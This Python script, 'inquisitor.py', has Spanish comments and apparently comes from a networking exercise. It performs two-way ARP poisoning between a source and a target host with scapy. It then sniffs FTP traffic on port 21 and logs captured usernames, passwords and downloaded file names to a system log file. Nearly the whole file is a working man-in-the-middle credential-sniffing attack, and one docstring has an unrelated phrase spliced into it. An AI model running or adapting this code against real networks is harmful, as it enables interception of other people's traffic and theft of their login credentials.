import sys
import time
import threading
import logging
from scapy.all import *
from ftplib import FTP

# captured_packets = []

def get_mac_address(ip_address):
    """
    Obtiene la dirección MAC deContinuación del código de inquisitor.py:
un dispositivo dado su dirección IP utilizando ARP.
    """
    arp = ARP(pdst=ip_address)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    if result:
        return result[0][1].hwsrc
def arp_poison(target_ip, target_mac, source_ip, source_mac):
    """
    Realiza un ataque de envenenamiento ARP en ambos sentidos
    """
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    source_packet = ARP(op=2, pdst=source_ip, hwdst=source_mac, psrc=target_ip, hwsrc=target_mac)
    print(target_packet.show())
    print(source_packet.show())
    while True:
        try:
            send(target_packet, verbose=False)
            send(source_packet, verbose=False)
            time.sleep(3)
        except KeyboardInterrupt:
            restore_arp_tables(target_ip, target_mac, source_ip, source_mac)
            break
def restore_arp_tables(target_ip, target_mac, source_ip, source_mac):
    """
    Restaura las tablas ARP de los dispositivos después de terminar el ataque
    """
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    source_packet = ARP(op=2, pdst=source_ip, hwdst=source_mac, psrc=target_ip, hwsrc=target_mac)
    send(target_packet, count=5)
    send(source_packet, count=5)
    logging.info("ARP tables restored")

def packet_handler(packet):
    # captured_packets.append(packet)
    # logging.info(f"Packet:{packet}")
    if packet.haslayer(TCP) and packet[TCP].dport == 21:
        logging.info(f"Packet:{packet}")
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            logging.info(f"Raw Data: {payload}")
            if 'USER' in payload:
                username = payload.split('USER ')[1].split('\r\n')[0]
                logging.info(f"FTP Username: {username}")
            if 'PASS' in payload:
                password = payload.split('PASS ')[1].split('\r\n')[0]
                logging.info(f"FTP Password: {password}")
            if 'get ' in payload:
                filename = payload.split('get ')[1].split('\r\n')[0]
                logging.info(f"FTP File Downloaded: {filename}")
        # logging.info(f"FTP Traffic: {packet[IP].src} -> {packet[IP].dst}: {packet[TCP].payload}")


def sniff_ftp_traffic():
    """
    Sniffea el tráfico en el puerto 21 (FTP) y muestra en tiempo real los paquetes intercambiados.
    """
    try:
        sniff(filter='tcp port 21', prn=packet_handler, store=1)
        # for packet in captured_packets:
            # print(packet.summary())
    except KeyboardInterrupt:
        return 0

def main():
    if len(sys.argv) != 5:
        print("Usage: python inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target>")
        return
    source_ip, source_mac, target_ip, target_mac = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    # Realizar el ataque de envenenamiento ARP en ambos sentidos
    arp_thread = threading.Thread(target=arp_poison, args=(target_ip, target_mac, source_ip, source_mac))
    arp_thread.daemon = True
    arp_thread.start()
    ftp_thread = threading.Thread(target=sniff_ftp_traffic)

    ftp_thread.start()
    # Interceptar el tráfico resultante del inicio de sesión en un servidor FTP
    # Visualizar en tiempo real los nombres de los archivos intercambiados entre el cliente y el servidor FTP
    logging.basicConfig(filename='/var/log/inquisitor.log', level=logging.INFO, format='%(asctime)s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    # sniff(filter='tcp port 21', prn=lambda x: logging.info(f"FTP Traffic: {x[IP].src} -> {x[IP].dst}: {x[TCP].payload}"), store=0)
    # Esperar a que los hilos finalicen
    
# Esperar a que los hilos finalicen
    # arp_thread.join()
    ftp_thread.join()


if __name__ == '__main__':
    main()